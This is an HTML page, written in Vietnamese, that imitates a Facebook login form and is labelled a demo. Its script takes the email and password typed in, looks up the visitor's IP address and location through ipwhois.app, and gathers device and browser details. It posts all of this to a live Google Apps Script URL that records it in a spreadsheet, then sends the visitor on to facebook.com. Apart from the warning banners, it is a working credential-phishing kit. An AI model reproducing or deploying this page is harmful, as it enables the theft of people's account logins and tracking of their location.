<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook (Demo)</title>
  <style>
    body {background:#f0f2f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .fb-box {background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.15);width:100%;max-width:400px;text-align:center}
    .fb-logo {width:120px;margin-bottom:20px}
    .warning {color:red;font-size:14px;font-weight:bold;margin-bottom:15px}
    input {width:100%;padding:12px;margin-bottom:12px;border:1px solid #ccc;border-radius:6px;font-size:14px}
    .fb-btn {background:#1877f2;color:#fff;padding:12px;border:none;border-radius:6px;font-size:16px;cursor:pointer;width:100%}
    .fb-btn:hover {background:#165fbe}
  </style>
</head>
<body>
  <div class="fb-box">
    <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook"/>
    <div class="warning">⚠ Demo: Không nhập thông tin thật!</div>
    <form id="loginForm">
      <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
      <input type="password" id="password" placeholder="Mật khẩu" required>
      <button class="fb-btn" type="submit">Đăng nhập</button>
    </form>
  </div>

  <script>
    const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyDIwkk_Q9IFLoiWVjsOymqYvV7eflgs1xfLA5KkAlya-XUl3r9o8KO24k5J8a7hVCvPQ/exec"; // Dán URL exec Apps Script
    const API_KEY = "demo123";

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      alert("⚠ Demo: Nếu đây là thật, bạn đã mất thông tin!");

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const isMobile = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
      const language = navigator.language || "Không rõ";
      const ua = navigator.userAgent;

      let ip = "Không xác định", city = "Không rõ", region = "Không rõ", country = "Không rõ", countryCode = "N/A";

      try {
        const res = await fetch("https://ipwhois.app/json/");
        const data = await res.json();
        ip = data.ip || ip;
        city = data.city || city;
        region = data.region || region;
        country = data.country || country;
        countryCode = data.country_code || countryCode;
      } catch (err) {
        console.error("Lỗi IP:", err);
      }

      try {
        const response = await fetch(GOOGLE_SHEET_URL, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            key: API_KEY,
            email,
            password,
            ip,
            city,
            region,
            country,
            countryCode,
            device: isMobile,
            language,
            userAgent: ua
          })
        });

        const result = await response.json();
        console.log("Kết quả:", result);

        if (result.status === "success") {
          window.location.href = "https://facebook.com";
        } else {
          alert("Lỗi gửi dữ liệu: " + result.message);
        }

      } catch (error) {
        console.error("Fetch lỗi:", error);
      }
    });
  </script>
</body>
</html>
